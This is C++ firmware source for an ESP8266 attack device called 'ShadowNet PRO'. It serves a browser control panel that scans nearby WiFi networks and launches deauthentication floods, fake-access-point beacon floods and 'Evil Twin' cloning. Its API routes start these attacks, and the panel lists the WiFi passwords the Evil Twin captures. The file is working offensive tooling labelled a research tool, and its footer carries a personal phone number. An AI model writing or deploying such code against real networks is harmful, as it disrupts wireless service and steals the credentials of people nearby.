/*
 * web_server.cpp — ShadowNet PRO Web Dashboard
 *
 * Full control panel accessible via phone/laptop browser.
 * Created by: Shawal Ahmad Mohmand
 */

#include "web_server.h"
#include "battery_manager.h"
#include "nrf_monitor.h"
#include "packet_injection.h"
#include "display_manager.h"
#include "wifi_scanner.h"
#include "wifi_attacks.h"
#include "evil_twin.h"

static ESP8266WebServer _server(WEB_PORT);
static bool _serverActive = false;

// ── Dashboard HTML ──────────────────────────────────────────────
static const char _dashPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ShadowNet PRO</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap');
:root{--bg:#0a0a0f;--card:#12121a;--border:#1e1e2e;--accent:#6C63FF;
--accent2:#00d4aa;--danger:#ff4757;--warn:#ffa502;--text:#e1e1e6;
--dim:#6b7280;--glow:rgba(108,99,255,0.15)}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);
min-height:100vh;padding:0}
.topbar{background:linear-gradient(135deg,#6C63FF,#5A52D5);padding:15px 20px;
display:flex;justify-content:space-between;align-items:center;
box-shadow:0 4px 20px rgba(108,99,255,0.3)}
.topbar h1{font-family:'JetBrains Mono',monospace;font-size:18px;color:#fff;
text-shadow:0 0 10px rgba(255,255,255,0.3)}
.topbar .info{font-size:11px;color:rgba(255,255,255,0.7)}
.container{padding:15px;max-width:600px;margin:0 auto}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:12px;
padding:12px;text-align:center}
.stat .val{font-size:24px;font-weight:700;color:var(--accent);
font-family:'JetBrains Mono',monospace}
.stat .lbl{font-size:11px;color:var(--dim);margin-top:4px;text-transform:uppercase}
.section{background:var(--card);border:1px solid var(--border);border-radius:12px;
margin-bottom:12px;overflow:hidden}
.section h2{font-size:13px;padding:10px 15px;background:rgba(108,99,255,0.1);
border-bottom:1px solid var(--border);color:var(--accent);
font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:1px}
.section .body{padding:12px 15px}
.btn{display:inline-block;padding:10px 18px;border:none;border-radius:8px;
font-size:13px;font-weight:600;cursor:pointer;transition:.2s;margin:4px;
font-family:'Inter',sans-serif}
.btn-primary{background:var(--accent);color:#fff;box-shadow:0 2px 8px rgba(108,99,255,0.3)}
.btn-danger{background:var(--danger);color:#fff;box-shadow:0 2px 8px rgba(255,71,87,0.3)}
.btn-success{background:var(--accent2);color:#000;box-shadow:0 2px 8px rgba(0,212,170,0.3)}
.btn-warn{background:var(--warn);color:#000}
.btn:hover{transform:translateY(-1px);filter:brightness(1.15)}
.btn:active{transform:translateY(0)}
.net-list{max-height:250px;overflow-y:auto;scrollbar-width:thin}
.net{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;
justify-content:space-between;align-items:center;font-size:12px;cursor:pointer;
transition:.15s}
.net:hover{background:var(--glow)}
.net .ssid{font-weight:600;color:var(--text)}
.net .meta{color:var(--dim);font-family:'JetBrains Mono',monospace;font-size:11px}
.net .actions{display:flex;gap:5px}
.net .actions button{padding:4px 8px;font-size:10px;border-radius:5px}
#log{background:#050508;border:1px solid var(--border);border-radius:8px;
padding:10px;font-family:'JetBrains Mono',monospace;font-size:11px;
color:var(--accent2);max-height:150px;overflow-y:auto;margin-top:10px;
line-height:1.6}
.cred{background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.3);
border-radius:8px;padding:10px;margin:5px 0;font-size:12px}
.cred .pw{color:var(--danger);font-weight:700;font-family:'JetBrains Mono',monospace}
.footer{text-align:center;padding:20px;color:var(--dim);font-size:11px}
.footer a{color:var(--accent);text-decoration:none}
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
.badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:600}
.badge-ok{background:rgba(0,212,170,0.2);color:var(--accent2)}
.badge-err{background:rgba(255,71,87,0.2);color:var(--danger)}
.badge-run{background:rgba(108,99,255,0.2);color:var(--accent)}
</style>
</head>
<body>
<div class="topbar">
<div><h1>⚡ ShadowNet PRO</h1>
<div class="info">Wireless Research Tool v2.0</div></div>
<div style="text-align:right">
<span class="badge badge-ok" id="statusBadge">ONLINE</span>
</div>
</div>
<div class="container">
<div class="stats">
<div class="stat"><div class="val" id="batt">--</div><div class="lbl">Battery %</div></div>
<div class="stat"><div class="val" id="uptime">--</div><div class="lbl">Uptime</div></div>
<div class="stat"><div class="val" id="heap">--</div><div class="lbl">Free RAM</div></div>
<div class="stat"><div class="val" id="clients">--</div><div class="lbl">AP Clients</div></div>
</div>

<div class="section">
<h2>📡 WiFi Scanner</h2>
<div class="body">
<button class="btn btn-primary" onclick="scanWifi()">Scan Networks</button>
<div class="net-list" id="networks"></div>
</div>
</div>

<div class="section">
<h2>⚔️ Attacks</h2>
<div class="body">
<button class="btn btn-danger" onclick="startBeacon()">Fake APs</button>
<button class="btn btn-danger" onclick="stopAttack()">Stop All</button>
<div id="atkStatus" style="margin-top:8px;font-size:12px;color:var(--dim)"></div>
</div>
</div>

<div class="section">
<h2>🔑 Captured Credentials</h2>
<div class="body" id="creds"><span style="color:var(--dim);font-size:12px">No credentials captured yet</span></div>
</div>

<div class="section">
<h2>📋 System Log</h2>
<div id="log">[SYS] ShadowNet PRO online<br>[SYS] Dashboard ready</div>
</div>

<div class="footer">
Created by <strong>Shawal Ahmad Mohmand</strong><br>
📱 +92 304 975 8182<br>
<a href="https://www.google.com/search?q=Shawal+Ahmad+Mohmand" target="_blank">Search on Google →</a>
</div>
</div>

<script>
function addLog(msg){
  var l=document.getElementById('log');
  l.innerHTML+='['+new Date().toLocaleTimeString()+'] '+msg+'<br>';
  l.scrollTop=l.scrollHeight;
}
function scanWifi(){
  addLog('Starting WiFi scan...');
  fetch('/api/scan').then(r=>r.json()).then(d=>{
    var h='';
    d.networks.forEach((n,i)=>{
      h+='<div class="net"><div><span class="ssid">'+n.ssid+'</span><br>';
      h+='<span class="meta">Ch:'+n.ch+' | '+n.rssi+'dBm | '+n.enc+'</span></div>';
      h+='<div class="actions">';
      h+='<button class="btn btn-danger" onclick="deauth('+i+')">Deauth</button>';
      h+='<button class="btn btn-warn" onclick="evilTwin('+i+')">Clone</button>';
      h+='</div></div>';
    });
    document.getElementById('networks').innerHTML=h;
    addLog('Found '+d.networks.length+' networks');
  });
}
function deauth(idx){
  addLog('Starting deauth on target #'+idx);
  fetch('/api/deauth?target='+idx);
}
function evilTwin(idx){
  addLog('Starting Evil Twin on target #'+idx);
  fetch('/api/eviltwin?target='+idx);
}
function startBeacon(){
  addLog('Starting beacon flood...');
  fetch('/api/beacon_start');
}
function stopAttack(){
  addLog('Stopping all attacks...');
  fetch('/api/stop_all');
}
setInterval(()=>{
  fetch('/api/status').then(r=>r.json()).then(d=>{
    document.getElementById('batt').innerText=d.batt+'%';
    document.getElementById('uptime').innerText=d.uptime+'s';
    document.getElementById('heap').innerText=(d.heap/1024).toFixed(1)+'K';
    document.getElementById('clients').innerText=d.clients;
    var as=d.atk_status||'Idle';
    document.getElementById('atkStatus').innerHTML=
      '<span class="badge '+(as!='Idle'?'badge-run pulse':'badge-ok')+'">'+as+'</span>'+
      (d.atk_frames>0?' | Frames: '+d.atk_frames:'');
    if(d.cred_count>0){
      var ch='';
      d.creds.forEach(c=>{
        ch+='<div class="cred">SSID: '+c.ssid+'<br>Password: <span class="pw">'+c.pw+'</span></div>';
      });
      document.getElementById('creds').innerHTML=ch;
    }
  });
},2000);
</script>
</body>
</html>
)rawliteral";

// ── Scan Results Storage for Web API ────────────────────────────
static WifiNetwork _webScanResults[MAX_WIFI_RESULTS];
static uint8_t _webScanCount = 0;

// ── Route Handlers ──────────────────────────────────────────────

static void _handleRoot() {
  _server.send(200, "text/html", FPSTR(_dashPage));
}

static void _handleStatus() {
  String json = "{";
  json += "\"batt\":" + String(battery_getPercent()) + ",";
  json += "\"batt_v\":" + String(battery_getVoltage(), 2) + ",";
  json += "\"uptime\":" + String(millis() / 1000) + ",";
  json += "\"heap\":" + String(ESP.getFreeHeap()) + ",";
  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
  json += "\"oled_ok\":" + String(display_isOk() ? "true" : "false") + ",";
  json += "\"nrf_ok\":" + String(nrf_monitor_isConnected() ? "true" : "false") + ",";

  // Attack status
  String atkStatus = "Idle";
  uint32_t atkFrames = 0;
  if (wifi_attacks_getState() == WATK_RUNNING) {
    atkStatus = "Deauth";
    atkFrames = wifi_attacks_getFrameCount();
  } else if (wifi_attacks_beacon_isRunning()) {
    atkStatus = "Beacon Flood";
    atkFrames = wifi_attacks_beacon_getCount();
  } else if (evil_twin_isRunning()) {
    atkStatus = "Evil Twin";
    atkFrames = evil_twin_getDeauthCount();
  }
  json += "\"atk_status\":\"" + atkStatus + "\",";
  json += "\"atk_frames\":" + String(atkFrames) + ",";

  // Credentials
  json += "\"cred_count\":" + String(evil_twin_getCredCount()) + ",";
  json += "\"creds\":[";
  CapturedCred* creds = evil_twin_getCreds();
  for (uint8_t i = 0; i < evil_twin_getCredCount(); i++) {
    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + String(creds[i].ssid) + "\",\"pw\":\"" + String(creds[i].password) + "\"}";
  }
  json += "]";
  json += "}";
  _server.send(200, "application/json", json);
}

static void _handleScan() {
  // Synchronous scan
  WiFi.mode(WIFI_AP_STA);
  int n = WiFi.scanNetworks();
  _webScanCount = min((int)MAX_WIFI_RESULTS, n);

  String json = "{\"networks\":[";
  for (uint8_t i = 0; i < _webScanCount; i++) {
    strncpy(_webScanResults[i].ssid, WiFi.SSID(i).c_str(), 32);
    _webScanResults[i].ssid[32] = '\0';
    _webScanResults[i].rssi = WiFi.RSSI(i);
    _webScanResults[i].channel = WiFi.channel(i);
    _webScanResults[i].encType = WiFi.encryptionType(i);
    memcpy(_webScanResults[i].bssid, WiFi.BSSID(i), 6);

    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"ch\":" + String(WiFi.channel(i)) + ",";
    json += "\"enc\":\"" + String(wifi_scanner_encLabel(WiFi.encryptionType(i))) + "\"}";
  }
  json += "]}";
  WiFi.scanDelete();
  _server.send(200, "application/json", json);
}

static void _handleDeauth() {
  if (_server.hasArg("target")) {
    int idx = _server.arg("target").toInt();
    if (idx >= 0 && idx < _webScanCount) {
      wifi_attacks_init();
      wifi_attacks_deauth_start(_webScanResults[idx].bssid, _webScanResults[idx].channel);
      _server.send(200, "application/json", "{\"ok\":true,\"msg\":\"Deauth started\"}");
      return;
    }
  }
  _server.send(400, "application/json", "{\"ok\":false,\"msg\":\"Invalid target\"}");
}

static void _handleEvilTwin() {
  if (_server.hasArg("target")) {
    int idx = _server.arg("target").toInt();
    if (idx >= 0 && idx < _webScanCount) {
      evil_twin_start(
        _webScanResults[idx].ssid,
        _webScanResults[idx].channel,
        _webScanResults[idx].bssid
      );
      _server.send(200, "application/json", "{\"ok\":true,\"msg\":\"Evil twin started\"}");
      return;
    }
  }
  _server.send(400, "application/json", "{\"ok\":false,\"msg\":\"Invalid target\"}");
}

static void _handleBeaconStart() {
  wifi_attacks_beacon_start();
  _server.send(200, "application/json", "{\"ok\":true,\"msg\":\"Beacon flood started\"}");
}

static void _handleStopAll() {
  wifi_attacks_deauth_stop();
  wifi_attacks_beacon_stop();
  evil_twin_stop();
  _server.send(200, "application/json", "{\"ok\":true,\"msg\":\"All attacks stopped\"}");
}

// ── Public API ──────────────────────────────────────────────────

void web_server_init() {
  WiFi.softAP(WEB_AP_SSID, WEB_AP_PASS);
  DBGF("[WEB] AP Started: %s  IP: %s\n", WEB_AP_SSID, WiFi.softAPIP().toString().c_str());

  _server.on("/", _handleRoot);
  _server.on("/api/status", _handleStatus);
  _server.on("/api/scan", _handleScan);
  _server.on("/api/deauth", _handleDeauth);
  _server.on("/api/eviltwin", _handleEvilTwin);
  _server.on("/api/beacon_start", _handleBeaconStart);
  _server.on("/api/stop_all", _handleStopAll);
  _server.begin();
  _serverActive = true;
  DBGLN(F("[WEB] Dashboard server started"));
}

void web_server_update() {
  if (_serverActive) _server.handleClient();
}
